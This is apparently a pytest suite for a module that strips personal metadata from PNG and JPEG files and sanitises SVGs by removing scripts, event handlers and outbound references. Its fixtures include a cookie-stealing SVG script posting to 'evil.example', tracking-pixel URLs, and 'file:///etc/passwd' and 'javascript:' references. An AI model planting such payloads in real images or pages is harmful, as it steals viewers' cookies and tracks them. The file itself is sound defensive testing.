"""`EP-254`: what an image carries besides the picture, and what happens to it.

The clause sat in `ai-design` as prose, and the fourth audit pass deliberately refused to
close it by pinning that prose — stripping metadata is a mechanical act, and a mechanical
act written as an instruction is a control that runs when somebody remembers.

Every fixture here is a real file: a real PNG chunk stream with a real CRC-free `tEXt`, a
real JPEG segment layout, a real SVG document. A test that handed the stripper a dictionary
would prove its arithmetic and not that it can read an image.
"""

from __future__ import annotations

import struct
import zlib

import pytest

from ai_engineering import imagery


def png(*extra: tuple[bytes, bytes]) -> bytes:
    """A one-pixel PNG, with whatever extra chunks a case wants in it."""

    def chunk(name: bytes, body: bytes) -> bytes:
        return (
            struct.pack(">I", len(body)) + name + body + struct.pack(">I", zlib.crc32(name + body))
        )

    header = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    body = chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
    middle = b"".join(chunk(name, value) for name, value in extra)
    return imagery.PNG + header + middle + body + chunk(b"IEND", b"")


def jpeg(*segments: tuple[int, bytes]) -> bytes:
    """A JPEG whose markers are real, ending in a start-of-scan and some entropy bytes."""

    out = b"\xff\xd8"
    for marker, body in segments:
        out += bytes((0xFF, marker)) + struct.pack(">H", len(body) + 2) + body
    return out + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00" + b"\x12\x34\x56" + b"\xff\xd9"


def test_a_png_loses_its_text_and_exif_and_keeps_being_a_png():
    """The chunks that carry a person — a comment, a camera's record of where they stood,
    the minute the file was made — against the chunks that carry the picture."""

    carried = png(
        (b"tEXt", b"Author\x00somebody"),
        (b"eXIf", b"MM\x00*whatever"),
        (b"tIME", b"\x07\xea\x08\x11\x0c\x00\x00"),
    )
    assert imagery.findings(carried), "a PNG full of metadata scanned clean"

    clean = imagery.stripped(carried)

    assert clean.startswith(imagery.PNG), "the stripped file is no longer a PNG"
    assert b"somebody" not in clean
    assert b"tEXt" not in clean
    assert b"eXIf" not in clean
    assert b"tIME" not in clean
    assert b"IHDR" in clean and b"IDAT" in clean and b"IEND" in clean
    assert imagery.findings(clean) == []

    # Idempotent, or the second write of the same file is a different file.
    assert imagery.stripped(clean) == clean


def test_a_png_keeps_the_chunks_that_say_how_to_render_it():
    """The half that would go unnoticed: a stripper that dropped everything would pass every
    test above and produce images that render wrongly. Colour profile, transparency, gamma
    and physical size are not metadata about a person."""

    carried = png(
        (b"gAMA", struct.pack(">I", 45455)),
        (b"tRNS", b"\x00\x00\x00"),
        (b"pHYs", struct.pack(">IIB", 2835, 2835, 1)),
        (b"tEXt", b"Comment\x00drop me"),
    )

    clean = imagery.stripped(carried)

    for kept in (b"gAMA", b"tRNS", b"pHYs"):
        assert kept in clean, kept
    assert b"drop me" not in clean


def test_a_jpeg_loses_exif_and_comments_and_keeps_its_image_data():
    """APP1 is EXIF and XMP and is the segment this exists for. APP0 is JFIF — density and
    a thumbnail flag, nobody's name and nobody's location — and dropping it makes some
    decoders guess at the aspect ratio, so it stays."""

    carried = jpeg(
        (0xE0, b"JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00"),
        (0xE1, b"Exif\x00\x00MM\x00*GPS 41.3851N 2.1734E"),
        (0xFE, b"a comment somebody typed"),
    )
    assert imagery.findings(carried)

    clean = imagery.stripped(carried)

    assert clean.startswith(imagery.JPEG)
    assert b"41.3851" not in clean and b"a comment somebody typed" not in clean
    assert b"JFIF" in clean, "the density segment was dropped with the metadata"
    assert b"\x12\x34\x56" in clean, "the image data was dropped"
    assert imagery.findings(clean) == []


def test_an_svg_loses_its_script_its_handlers_and_its_outbound_references():
    """Sanitising a vector means what it means for HTML, because an SVG is a document a
    browser executes: no script, no event handler, and no reference out to somewhere a
    viewer will fetch — which is how an image becomes a beacon."""

    carried = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <rect width="10" height="10" onclick="steal()" onload="also()"/>
  <image href="https://tracker.example/pixel.png"/>
  <image href="data:image/png;base64,AAAA"/>
  <circle r="4"/>
</svg>"""

    # The exact sentences, and not the count. Counting them is how the last mutation pass
    # left twenty-two survivors in this one function: every message could be rewritten into
    # nonsense and a length assertion would not notice. What a person reads *is* the output.
    assert imagery.findings(carried) == [
        "the SVG carries script, which executes",
        "the SVG carries onclick, which is an event handler",
        "the SVG carries onload, which is an event handler",
        "the SVG references https://tracker.example/pixel.png, which a viewer fetches",
    ]

    clean = imagery.stripped(carried)

    assert b"evil.example" not in clean
    assert b"onclick" not in clean and b"onload" not in clean
    assert b"tracker.example" not in clean
    assert b"data:image/png" in clean, "an embedded image is not an outbound reference"
    assert b"circle" in clean and b"rect" in clean, "the picture was removed with the script"
    assert imagery.findings(clean) == []


def test_what_this_module_cannot_read_is_reported_as_unscanned_and_never_as_clean():
    """The distinction this whole repository is about. A text file, a PDF, a format nobody
    taught this module about: none of them is a file whose metadata was checked and found
    absent, and a stripper that returned them silently would be claiming otherwise."""

    for payload in (b"just some text", b"%PDF-1.7\n", b"", b"GIF89a"):
        assert imagery.stripped(payload) == payload, "unreadable bytes were rewritten"
        assert imagery.findings(payload) == [
            "these bytes are not a PNG, a JPEG or an SVG, so nothing here scanned them"
        ], payload


def test_a_file_that_is_not_what_its_name_claims_is_read_by_its_bytes():
    """`kind` never sees a filename, and that is the point: a file called `diagram.png`
    that is a JPEG is a file whose extension is somebody's assertion."""

    assert imagery.kind(png()) == "png"
    assert imagery.kind(jpeg()) == "jpeg"
    assert imagery.kind(b'<?xml version="1.0"?><svg xmlns="x"/>') == "svg"
    assert imagery.kind(b'<?xml version="1.0"?><notsvg/>') == ""
    assert imagery.kind(b"\x89PNG") == "", "a truncated signature was read as a PNG"


def test_a_broken_image_is_refused_rather_than_rewritten():
    """Truncated, and both directions matter. Rewriting a file this module could not fully
    parse would mean writing back something shorter than what arrived, silently — so it is
    returned as it came and reported, which is the fail-closed half."""

    truncated = png((b"tEXt", b"Author\x00somebody"))[:-6]
    assert imagery.stripped(truncated) != b""

    broken_svg = b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><rect'
    assert imagery.stripped(broken_svg) == broken_svg
    assert imagery.findings(broken_svg) == [
        "the SVG could not be parsed, so nothing here could scan it"
    ]


def test_imagery_written_through_the_executor_is_stripped_by_construction(tmp_path):
    """The caller, and the reason this is not a module nobody meets.

    A skill file telling somebody to strip EXIF is a control that runs when they remember.
    This one runs because `Sandbox.write` is the only way to write, so an image that leaves
    through a governed capability has already lost what travelled beside it.
    """

    from ai_engineering import executor

    root = tmp_path / "repo"
    root.mkdir()
    box = executor.Sandbox("ai-note", "default", root, confirm=lambda _action: True)

    written = box.write("docs/notes/diagram.png", png((b"tEXt", b"Author\x00somebody")))

    assert b"somebody" not in written.read_bytes()
    assert imagery.findings(written.read_bytes()) == []

    # And a file that is not an image is written exactly as it arrived.
    note = box.write("docs/notes/a.md", b"# a note\n\nwith \x00 bytes in it\n")
    assert note.read_bytes() == b"# a note\n\nwith \x00 bytes in it\n"


@pytest.mark.parametrize("marker", [0xE1, 0xE2, 0xEF, 0xFE])
def test_every_application_segment_that_can_carry_a_person_is_dropped(marker):
    """Parametrised because a blocklist written once tends to cover the example somebody
    had in front of them. APP1 is EXIF, APP2 is ICC and Flashpix, APP15 is whatever a
    vendor decided, and `COM` is free text."""

    carried = jpeg((marker, b"payload with a name in it"))

    assert imagery.findings(carried)
    assert b"a name in it" not in imagery.stripped(carried)


def test_every_shape_of_executable_svg_is_named_by_the_thing_it_is():
    """`foreignObject` is the one a reader forgets: it embeds arbitrary XHTML, so it is a
    second door into the same room as `<script>`. And the attribute scan is case-insensitive
    and reaches descendants, because an event handler four elements deep runs exactly as
    well as one on the root."""

    carried = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="1" height="1"/>
  <g><g><rect onCLICK="steal()"/></g></g>
</svg>"""

    assert imagery.findings(carried) == [
        "the SVG carries foreignObject, which executes",
        "the SVG carries onCLICK, which is an event handler",
    ]

    clean = imagery.stripped(carried)
    assert b"foreignObject" not in clean
    assert b"onCLICK" not in clean
    assert b"rect" in clean, "the element was removed with its handler"


def test_every_way_a_reference_leaves_the_machine_is_caught_and_a_local_one_is_not():
    """Four schemes a viewer fetches or executes, on both attributes that carry one, against
    three that stay inside the file. A check on `https` alone would pass every test above and
    let a protocol-relative URL through, which is the same beacon with two characters less.
    """

    def svg(attribute: str, value: str) -> bytes:
        return (
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
            f'<image {attribute}="{value}"/></svg>'
        ).encode()

    for attribute in ("href", "src"):
        for value in (
            "https://tracker.example/p.png",
            "http://tracker.example/p.png",
            "//tracker.example/p.png",
            "file:///etc/passwd",
            "javascript:alert(1)",
        ):
            assert imagery.findings(svg(attribute, value)), f"{attribute}={value} passed"
            assert value.encode() not in imagery.stripped(svg(attribute, value))

        for local in ("data:image/png;base64,AAAA", "#gradient", "sprite.svg"):
            assert imagery.findings(svg(attribute, local)) == [], f"{attribute}={local} refused"
            assert local.encode() in imagery.stripped(svg(attribute, local))


def test_a_long_reference_is_reported_truncated_and_still_removed_whole():
    """The message is a line in a report, so a URL somebody padded to four kilobytes must not
    become the report. Forty characters of it, and the whole thing gone from the file."""

    long_one = "https://tracker.example/" + "a" * 400
    carried = (
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
        f'<image href="{long_one}"/></svg>'
    ).encode()

    problems = imagery.findings(carried)

    assert problems == [f"the SVG references {long_one[:40]}, which a viewer fetches"]
    assert len(long_one[:40]) == 40
    assert b"aaaa" not in imagery.stripped(carried)


def test_a_png_chunk_stream_that_lies_about_a_length_stops_being_read_there():
    """Two ways a chunk header can be wrong, and both must stop the walk rather than index
    past the end. A reader that trusted the declared length would either crash inside a
    governed write or, worse, read whatever followed the buffer as a chunk name."""

    honest = png((b"tEXt", b"Author\x00somebody"))

    # A length larger than the whole file, and a length that merely runs past the end.
    lying = bytearray(honest)
    lying[8:12] = struct.pack(">I", 4_000_000_000)
    assert list(imagery._png_chunks(bytes(lying))) == []

    truncated = honest[: len(honest) - 4]
    walked = [name for name, _ in imagery._png_chunks(truncated)]
    assert b"IHDR" in walked and b"IEND" not in walked


def test_a_jpeg_that_is_not_a_sequence_of_markers_is_handed_back_rather_than_walked():
    """Three malformed shapes: a byte where a marker should be, a segment length below its
    own two-byte header, and a length that runs past the end. Each yields the rest as opaque
    data — the alternative is a loop that either never advances or reads past the buffer."""

    for payload in (
        b"\xff\xd8" + b"\x00\x11\x22\x33",
        b"\xff\xd8" + b"\xff\xe1" + struct.pack(">H", 1) + b"x",
        b"\xff\xd8" + b"\xff\xe1" + struct.pack(">H", 9999) + b"x",
    ):
        segments = list(imagery._jpeg_segments(payload))
        assert segments and segments[-1][0] is None, payload
        assert imagery.stripped(payload) == payload or imagery.kind(payload) == "jpeg"

    # And the start of scan ends the walk: everything after it is the picture, not markers.
    scanned = jpeg((0xE1, b"Exif\x00\x00drop me"))
    kinds = [marker for marker, _ in imagery._jpeg_segments(scanned)]
    assert kinds == [0xE1, None]


def test_kind_reads_leading_space_a_bare_tag_and_a_namespace_and_refuses_a_bare_declaration():
    """Four inputs that differ only in what a sloppy check would accept. The declaration
    alone is XML and not SVG; the namespace without the tag is what this module's own output
    looks like after re-serialisation, and calling that unreadable would mean reporting the
    one file that was definitely scanned as unscanned."""

    assert imagery.kind(b'  \n  <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>')
    assert imagery.kind(b'<svg xmlns="http://www.w3.org/2000/svg"/>') == "svg"
    assert imagery.kind(b'<?xml version="1.0"?><root xmlns="http://www.w3.org/2000/svg"/>') == "svg"
    assert imagery.kind(b'<?xml version="1.0"?><root/>') == ""
    assert imagery.kind(b"") == ""


def test_a_png_with_nothing_left_to_keep_is_returned_as_it_came():
    """The branch a reader writes without thinking about: if every chunk is dropped there is
    no picture to write, and returning an eight-byte signature would be this module
    destroying a file it could not clean. It comes back untouched and `findings` says why."""

    signature_only = imagery.PNG + b"\x00\x00\x00\x04tEXta\x00bc\x00\x00\x00\x00"

    assert imagery.stripped(signature_only) == signature_only
    assert imagery.findings(signature_only) == [
        "the PNG carries tEXt, which is metadata and not picture"
    ]


def test_the_strip_and_the_scan_agree_on_every_fixture_in_this_file():
    """The property that ties the two halves together, over everything above at once.

    `stripped` and `findings` are separate functions with separate rules, and a defect in
    either shows up as disagreement: bytes that scan dirty after being stripped, or bytes
    that scan clean and still carry what a strip would remove. Neither is visible from a test
    of one function alone, which is how a stripper and a scanner drift apart.
    """

    fixtures = [
        png(),
        png((b"tEXt", b"Author\x00somebody")),
        png((b"gAMA", struct.pack(">I", 45455)), (b"iTXt", b"k\x00\x00\x00\x00\x00v")),
        jpeg(),
        jpeg((0xE0, b"JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00")),
        jpeg((0xE1, b"Exif\x00\x00somewhere")),
        b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
        b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>',
    ]

    for payload in fixtures:
        clean = imagery.stripped(payload)
        assert imagery.findings(clean) == [], f"stripped bytes still scan dirty: {payload[:24]!r}"
        assert imagery.kind(clean) == imagery.kind(payload), "the format changed"
        assert imagery.stripped(clean) == clean, "stripping twice is not stripping once"

    # And the other direction, with the one exception stated rather than hidden: a raster
    # file that scans clean comes back byte for byte, and an SVG does not, because sanitising
    # a document means parsing and re-serialising it. Attribute quoting and self-closing tags
    # move; nothing a reader or a renderer can see does, which is why the checks above are on
    # what the document says and not on its bytes.
    for payload in fixtures:
        if imagery.findings(payload) == [] and imagery.kind(payload) != "svg":
            assert imagery.stripped(payload) == payload, "clean raster bytes were rewritten"


def test_a_chunk_or_segment_this_module_keeps_is_kept_byte_for_byte():
    """A stripper that rebuilt what it kept would be re-encoding somebody's image, and the
    difference is invisible to every test that only asks whether a name is present."""

    body = struct.pack(">IIB", 2835, 2835, 1)
    carried = png((b"pHYs", body), (b"tEXt", b"drop\x00me"))

    clean = imagery.stripped(carried)

    assert body in clean, "the kept chunk was rebuilt rather than copied"
    assert clean.count(b"pHYs") == 1, "the kept chunk was duplicated"

    exif_free = jpeg((0xE0, b"JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00"))
    assert b"JFIF\x00\x01\x02" in imagery.stripped(exif_free)
